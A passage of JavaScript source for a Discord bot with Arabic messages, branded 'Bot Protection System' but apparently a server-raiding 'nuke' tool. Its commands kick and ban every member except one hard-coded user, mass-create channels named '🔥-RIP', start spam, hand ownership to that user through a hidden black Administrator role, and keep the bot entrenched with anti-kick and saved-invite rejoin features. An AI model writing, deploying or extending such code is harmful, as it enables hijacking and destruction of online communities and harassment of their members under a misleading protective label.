                        await new Promise(resolve => setTimeout(resolve, delay));
                    } catch {}
                }
            }
            
            for (const member of guild.members.cache.values()) {
                if (!destroyStatus.get(guildId)?.running) break;
                if (member.id === TARGET_USER_ID || member.user.bot) continue;
                try {
                    await member.kick('🔥 تدمير');
                    results.members++;
                    await new Promise(resolve => setTimeout(resolve, delay));
                } catch {}
            }
            
            for (const member of guild.members.cache.values()) {
                if (!destroyStatus.get(guildId)?.running) break;
                if (member.id === TARGET_USER_ID || member.user.bot) continue;
                try {
                    await member.ban({ reason: '🔥 تدمير' });
                    results.bans++;
                    await new Promise(resolve => setTimeout(resolve, delay));
                } catch {}
            }
            
            let roomCounter = 1;
            const batchSize = speed === 'ultra' ? 10 : 5;
            
            while (destroyStatus.get(guildId)?.running && results.rooms < maxRooms) {
                try {
                    const createPromises = [];
                    const batchCount = Math.min(batchSize, maxRooms - results.rooms);
                    
                    for (let i = 0; i < batchCount; i++) {
                        if (!destroyStatus.get(guildId)?.running) break;
                        const channelName = `🔥-RIP-${roomCounter}`;
                        createPromises.push(guild.channels.create({
                            name: channelName,
                            type: ChannelType.GuildText
                        }));
                        roomCounter++;
                    }
                    
                    const newChannels = await Promise.allSettled(createPromises);
                    
                    for (const result of newChannels) {
                        if (result.status === 'fulfilled') {
                            results.rooms++;
                            
                            if (!spamStarted) {
                                spamStarted = true;
                                spamChannel = result.value;
                                startSpam(guildId, result.value);
                                log(`💬 بدء السبام الفوري في الروم ${results.rooms}`, 'INFO');
                            }
                        }
                    }
                    
                    if (results.rooms % 10 === 0 || results.rooms === maxRooms) {
                        try {
                            await interaction.editReply(
                                `🔥 **جاري التدمير...**\n` +
                                `📁 ${results.rooms}/${maxRooms} روم\n` +
                                `💬 السبام يعمل ✅ (فوري)\n` +
                                `⚡ السرعة: ${speed}`
                            );
                        } catch {}
                    }
                    
                    await new Promise(resolve => setTimeout(resolve, 50));
                } catch (error) {
                    log(`⚠️ فشل إنشاء الروم: ${error.message}`, 'WARNING');
                    break;
                }
            }
            
        } catch (error) {
            log(`❌ خطأ أثناء التدمير: ${error.message}`, 'ERROR');
        }
        
        stopSpam(guildId);
        destroyStatus.set(guildId, { running: false });
        
        const embed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('🔥 تم التدمير!')
            .setDescription(
                `🛡️ الرتبة المخفية محمية بالكامل!\n` +
                `💬 بدأ السبام **فوراً** من أول روم!\n` +
                `🔒 **فقط <@${TARGET_USER_ID}> يمكنه استخدام الأوامر!**\n` +
                `🚫 **جميع المستخدمين الآخرين محظورون!**\n` +
                `⚡ السرعة: ${speed}`
            )
            .addFields(
                { name: '🗑️ رومات محذوفة', value: `${results.channels}`, inline: true },
                { name: '🎭 أدوار محذوفة', value: `${results.roles}`, inline: true },
                { name: '🚪 أعضاء مطرودون', value: `${results.members}`, inline: true },
                { name: '🔨 أعضاء محظورون', value: `${results.bans}`, inline: true },
                { name: '📁 رومات جديدة', value: `${results.rooms}/${maxRooms}`, inline: true },
                { name: '💬 السبام', value: spamStarted ? '✅ مفعل (فوري)' : '❌ معطل', inline: true },
                { name: '👑 مالك جديد', value: `<@${TARGET_USER_ID}>`, inline: true },
                { name: '📌 الإصدار', value: VERSION, inline: true }
            )
            .setFooter({ text: `Bot Protection System v${VERSION}` })
            .setTimestamp();
        
        try {
            await interaction.editReply({ content: null, embeds: [embed] });
        } catch (error) {
            log(`⚠️ فشل editReply: ${error.message}`, 'WARNING');
            try {
                await interaction.followUp({ embeds: [embed] });
            } catch {
                try {
                    const channel = guild.channels.cache.find(c => c.name === CONFIG.transferChannelName);
                    if (channel && channel.isTextBased()) {
                        await channel.send({ embeds: [embed] });
                    }
                } catch {}
            }
        }
    }
    
    // ===== /stop =====
    if (interaction.commandName === 'stop') {
        stopSpam(guildId);
        
        if (!destroyStatus.get(guildId)?.running) {
            await interaction.reply({
                content: 'ℹ️ لا يوجد تدمير يعمل.',
                flags: 64
            });
            return;
        }
        
        destroyStatus.set(guildId, { running: false });
        await interaction.reply('🛑 **تم إيقاف التدمير والسبام!**');
    }
    
    // ===== /stopspam =====
    if (interaction.commandName === 'stopspam') {
        const stopped = stopSpam(guildId);
        
        if (stopped) {
            await interaction.reply('🛑 **تم إيقاف السبام!**');
        } else {
            await interaction.reply('ℹ️ لا يوجد سبام يعمل.');
        }
    }
    
    // ===== /transfer =====
    if (interaction.commandName === 'transfer') {
        try {
            await interaction.deferReply({ flags: 0 });
        } catch (error) {
            log(`❌ فشل deferReply: ${error.message}`, 'ERROR');
            return;
        }
        
        const result = await transferOwnershipFast(guild);
        
        if (result.success) {
            const embed = new EmbedBuilder()
                .setTitle('✅ تم نقل الملكية!')
                .setDescription('👑 الرتبة غير مرئية ومحمية بالكامل!\n🔒 فقط المالك الجديد يمكنه استخدام الأوامر!')
                .setColor(0x00FF00)
                .setFooter({ text: `Bot Protection System v${VERSION}` });
            try {
                await interaction.editReply({ embeds: [embed] });
            } catch {
                await interaction.followUp({ embeds: [embed] });
            }
        } else {
            try {
                await interaction.editReply(`❌ فشل: ${result.message}`);
            } catch {
                await interaction.followUp(`❌ فشل: ${result.message}`);
            }
        }
    }
    
    // ===== /checkrole =====
    if (interaction.commandName === 'checkrole') {
        const protectedRole = protectedRoles.get(guildId);
        
        if (protectedRole) {
            const roleStillExists = guild.roles.cache.has(protectedRole.id);
            
            const embed = new EmbedBuilder()
                .setTitle('🔍 الرتبة المخفية')
                .setDescription(
                    `✅ الرتبة موجودة ومحمية!\n` +
                    `📛 الاسم: \`${protectedRole.name}\`\n` +
                    `🆔 ID: \`${protectedRole.id}\`\n` +
                    `👥 عدد الأعضاء: ${protectedRole.members.size}\n` +
                    `📊 المركز: ${protectedRole.position}\n` +
                    `🔒 موجودة فعلاً: ${roleStillExists ? '✅ نعم' : '❌ لا'}\n` +
                    `🎨 اللون: أسود (غير مرئي)`
                )
                .setColor(roleStillExists ? 0x00FF00 : 0xFF0000)
                .setFooter({ text: `Bot Protection System v${VERSION}` });
            await interaction.reply({ embeds: [embed], flags: 64 });
        } else {
            await interaction.reply({
                content: '❌ لا توجد رتبة مخفية في هذا السيرفر. استخدم /fixrole لإنشائها.',
                flags: 64
            });
        }
    }
    
    // ===== /fixrole =====
    if (interaction.commandName === 'fixrole') {
        const botMember = guild.members.cache.get(client.user.id);
        if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
            await interaction.reply({
                content: '❌ البوت يحتاج صلاحية Administrator',
                flags: 64
            });
            return;
        }

        await interaction.deferReply({ flags: 64 });

        try {
            const oldRole = guild.roles.cache.find(r => r.name === CONFIG.ownerRoleName);
            if (oldRole) {
                try {
                    await oldRole.delete('إعادة إنشاء الرتبة');
                    log(`🗑️ تم حذف الرتبة القديمة`, 'INFO');
                } catch {}
            }

            const newRole = await createProtectedRole(guild);

            if (newRole) {
                const targetMember = guild.members.cache.get(TARGET_USER_ID) || 
                                     await guild.members.fetch(TARGET_USER_ID).catch(() => null);
                
                if (targetMember) {
                    await targetMember.roles.add(newRole, 'نقل الملكية').catch(() => {});
                }

                if (botMember && !botMember.roles.cache.has(newRole.id)) {
                    await botMember.roles.add(newRole, 'حماية البوت').catch(() => {});
                }

                const embed = new EmbedBuilder()
                    .setTitle('✅ تم إنشاء الرتبة المحمية')
                    .setColor(0x00FF00)
                    .addFields(
                        { name: '📛 الاسم', value: newRole.name, inline: true },
                        { name: '🆔 ID', value: newRole.id, inline: true },
                        { name: '📊 المركز', value: `${newRole.position}`, inline: true },
                        { name: '👑 المالك', value: targetMember ? `<@${TARGET_USER_ID}>` : 'غير موجود', inline: true },
                        { name: '🔒 الصلاحيات', value: newRole.permissions.has(PermissionsBitField.Flags.Administrator) ? 'Administrator ✅' : 'ناقصة ❌', inline: true },
                        { name: '🤖 البوت', value: botMember.roles.cache.has(newRole.id) ? 'محمي ✅' : 'غير محمي ❌', inline: true }
                    )
                    .setFooter({ text: `Bot Protection System v${VERSION}` })
                    .setTimestamp();

                await interaction.editReply({ embeds: [embed] });
            } else {
                await interaction.editReply('❌ فشل إنشاء الرتبة. تأكد من أن البوت لديه صلاحية Administrator وأن رتبته أعلى من الرتب الأخرى.');
            }
        } catch (error) {
            log(`❌ فشل fixrole: ${error.message}`, 'ERROR');
            await interaction.editReply(`❌ خطأ: ${error.message}`);
        }
    }
    
    // ===== /antikick =====
    if (interaction.commandName === 'antikick') {
        const isEnabled = antiKickProtection.has(guildId);
        
        if (isEnabled) {
            clearInterval(antiKickProtection.get(guildId));
            antiKickProtection.delete(guildId);
            await interaction.reply({
                content: '🛡️ **تم إيقاف حماية البوت من الطرد.**',
                flags: 64
            });
        } else {
            enableAntiKickProtection(guildId);
            await interaction.reply({
                content: '🛡️ **تم تفعيل حماية البوت من الطرد!**\n✅ البوت سيعيد صلاحياته تلقائياً\n✅ البوت سيحاول العودة إذا تم طرده',
                flags: 64
            });
        }
    }
    
    // ===== /saveinvite =====
    if (interaction.commandName === 'saveinvite') {
        await interaction.deferReply({ flags: 64 });
        
        const invite = await saveGuildInvite(guild);
        
        if (invite) {
            const embed = new EmbedBuilder()
                .setTitle('💾 تم حفظ دعوة احتياطية')
                .setColor(0x00FF00)
                .addFields(
                    { name: '🔗 الرابط', value: invite.url, inline: false },
                    { name: '📝 الكود', value: `\`${invite.code}\``, inline: true },
                    { name: '📅 تم الإنشاء', value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true }
                )
                .setDescription('🛡️ إذا تم طرد البوت، سيحاول العودة تلقائياً عبر هذه الدعوة.')
                .setFooter({ text: `Bot Protection System v${VERSION}` })
                .setTimestamp();
            
            await interaction.editReply({ embeds: [embed] });
        } else {
            await interaction.editReply('❌ فشل حفظ الدعوة. تأكد من أن البوت لديه صلاحية Create Instant Invite.');
        }
    }
    
    // ===== /status =====
    if (interaction.commandName === 'status') {
        const uptime = Math.floor((Date.now() - botStartTime) / 1000);
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = uptime % 60;
        
        const embed = new EmbedBuilder()
            .setTitle('📊 حالة البوت')
            .setColor(0x0099FF)
            .addFields(
                { name: '👑 المالك', value: `<@${TARGET_USER_ID}>`, inline: true },
                { name: '📁 سيرفرات', value: `${client.guilds.cache.size}`, inline: true },
                { name: '👥 أعضاء', value: `${client.guilds.cache.reduce((acc, g) => acc + g.memberCount, 0)}`, inline: true },
                { name: '⏰ وقت التشغيل', value: `${hours}h ${minutes}m ${seconds}s`, inline: true },
                { name: '📌 الإصدار', value: VERSION, inline: true },
                { name: '🔒 محظورون', value: `${getBlockedUsers(guildId).length}`, inline: true },
                { name: '🔥 تدمير', value: destroyStatus.get(guildId)?.running ? '🟢 يعمل' : '🔴 متوقف', inline: true },
                { name: '💬 سبام', value: isSpamRunning(guildId) ? '✅ مفعل' : '❌ معطل', inline: true },
                { name: '🛡️ Anti-Kick', value: antiKickProtection.has(guildId) ? '✅ مفعل' : '❌ معطل', inline: true },
                { name: '🔗 دعوة محفوظة', value: guildInvites.has(guildId) ? '✅ موجودة' : '❌ غير موجودة', inline: true }
            )
            .setFooter({ text: `Bot Protection System v${VERSION}` })
            .setTimestamp();
        
        await interaction.reply({ embeds: [embed], flags: 64 });
    }
    
    // ===== /protect =====
    if (interaction.commandName === 'protect') {
        await interaction.reply('🛡️ **جاري تفعيل الحماية الكاملة...**', { flags: 64 });
        
        const result = await protectServer(guild);
        
        if (result) {
            await interaction.editReply('🛡️ **تم تفعيل الحماية الكاملة!**\n✅ جميع القنوات محمية\n✅ الرتبة مخفية ومحمية\n✅ Anti-Kick مفعل');
        } else {
            await interaction.editReply('❌ فشل تفعيل الحماية.');
        }
    }
    
    // ===== /unblock =====
    if (interaction.commandName === 'unblock') {
        const blockedList = getBlockedUsers(guildId);
        
        if (blockedList.length === 0) {
            await interaction.reply({
                content: 'ℹ️ لا يوجد مستخدمين محظورين.',
                flags: 64
            });
            return;
        }
        
        for (const userId of blockedList) {
            unblockUser(userId, guildId);
        }
        
        await interaction.reply({
            content: `🔓 **تم إلغاء حظر ${blockedList.length} مستخدم!**`,
            flags: 64
        });
    }
    
    // ===== /blocklist =====
    if (interaction.commandName === 'blocklist') {
        const blockedList = getBlockedUsers(guildId);
        
        if (blockedList.length === 0) {
            await interaction.reply({
                content: 'ℹ️ لا يوجد مستخدمين محظورين.',
                flags: 64
            });
            return;
        }
        
        const list = blockedList.map(id => `<@${id}>`).join('\n');
        
        const embed = new EmbedBuilder()
            .setTitle('📋 قائمة المحظورين')
            .setDescription(list || 'لا يوجد')
            .setColor(0xFF0000)
            .addFields({ name: 'عدد المحظورين', value: `${blockedList.length}`, inline: true })
            .setTimestamp();
        
        await interaction.reply({ embeds: [embed], flags: 64 });
    }
    
    // ===== /backup =====
    if (interaction.commandName === 'backup') {
        await interaction.reply('💾 **جاري إنشاء نسخة احتياطية...**', { flags: 64 });
        
        const backup = await backupServer(guild);
        
        if (backup) {
            const embed = new EmbedBuilder()
                .setTitle('💾 النسخة الاحتياطية')
                .setDescription(
                    `✅ تم إنشاء نسخة احتياطية!\n` +
                    `📛 السيرفر: ${backup.name}\n` +
                    `👥 الأعضاء: ${backup.memberCount}\n` +
                    `📁 الرومات: ${backup.channelCount}\n` +
                    `🎭 الأدوار: ${backup.roleCount}`
                )
                .setColor(0x00FF00)
                .setTimestamp();
            
            await interaction.editReply({ content: null, embeds: [embed] });
        } else {
            await interaction.editReply('❌ فشل إنشاء النسخة الاحتياطية.');
        }
    }
    
    // ===== /stats =====
    if (interaction.commandName === 'stats') {
        const totalCommands = Array.from(commandUsage.values()).reduce((a, b) => a + b, 0);
        const totalGuilds = client.guilds.cache.size;
        const totalMembers = client.guilds.cache.reduce((acc, g) => acc + g.memberCount, 0);
        const totalChannels = client.guilds.cache.reduce((acc, g) => acc + g.channels.cache.size, 0);
        
        const embed = new EmbedBuilder()
            .setTitle('📈 إحصائيات البوت')
            .setColor(0x0099FF)
            .addFields(
                { name: '📁 سيرفرات', value: `${totalGuilds}`, inline: true },
                { name: '👥 أعضاء', value: `${totalMembers}`, inline: true },
                { name: '📁 رومات', value: `${totalChannels}`, inline: true },
                { name: '📌 الإصدار', value: VERSION, inline: true },
                { name: '⚡ الأوامر المنفذة', value: `${totalCommands}`, inline: true },
                { name: '🔒 محظورون', value: `${Array.from(blockedUsers.values()).reduce((acc, m) => acc + m.size, 0)}`, inline: true },
                { name: '💾 نسخ احتياطية', value: `${serverBackups.size}`, inline: true },
                { name: '🔗 دعوات محفوظة', value: `${guildInvites.size}`, inline: true },
                { name: '⏰ وقت التشغيل', value: `${Math.floor((Date.now() - botStartTime) / 1000)}s`, inline: true }
            )
            .setFooter({ text: `Bot Protection System v${VERSION}` })
            .setTimestamp();
        
        await interaction.reply({ embeds: [embed], flags: 64 });
    }
});

// ==========================================
// ====== معالجة الأخطاء ======
// ==========================================
process.on('unhandledRejection', (error) => {
    log(`❌ خطأ غير معالج: ${error}`, 'ERROR');
});

process.on('uncaughtException', (error) => {
    log(`❌ استثناء غير ملتقط: ${error}`, 'ERROR');
});

// ==========================================
// ====== تشغيل البوت ======
// ==========================================
client.login(TOKEN).catch(error => {
    log(`❌ فشل الاتصال: ${error}`, 'ERROR');
});